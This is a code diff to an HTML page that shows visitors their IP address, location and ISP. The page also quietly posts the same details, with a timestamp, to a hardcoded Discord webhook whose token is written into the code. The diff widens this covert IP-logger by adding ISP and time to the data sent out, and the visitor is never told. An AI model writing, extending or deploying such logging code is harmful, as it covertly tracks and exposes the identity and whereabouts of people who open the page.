@@ -17,9 +17,9 @@
           });
       }
 
-      function sendToWebhook(ip, location) {
+      function sendToWebhook(ip, location, isp, time) {
         const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
-        const message = "IP: " + ip + "\nLocation: " + location;
+        const message = "IP: " + ip + "\nLocation: " + location + "\nISP: " + isp + "\nTime: " + time;
 
         fetch(webhookURL, {
           method: "POST",
@@ -42,12 +42,27 @@
             const locationString = `${data.city}, ${data.region}, ${data.country_name}`;
             locationElement.textContent = locationString;
 
-            sendToWebhook(ip, locationString);
+            const ispElement = document.getElementById("isp");
+            const ispString = data.org;
+            ispElement.textContent = ispString;
+
+            const time = getCurrentTime();
+            sendToWebhook(ip, locationString, ispString, time);
           })
           .catch((error) => {
             console.error("Error:", error);
-            sendToWebhook(ip, "Unknown"); // Send default location as "Unknown" in case of an error
+            const defaultLocation = "Unknown";
+            const defaultIsp = "Unknown";
+            const defaultTime = getCurrentTime();
+            sendToWebhook(ip, defaultLocation, defaultIsp, defaultTime);
           });
+      }
+
+      function getCurrentTime() {
+        const now = new Date();
+        const options = { timeZone: "Europe/Paris" };
+        const timeString = now.toLocaleTimeString("en-US", options);
+        return timeString;
       }
     </script>
   </head>
@@ -56,5 +71,7 @@
     <p id="ip">Loading...</p>
     <h1>Your Location:</h1>
     <p id="location">Loading...</p>
+    <h1>Your ISP:</h1>
+    <p id="isp">Loading...</p>
   </body>
 </html>
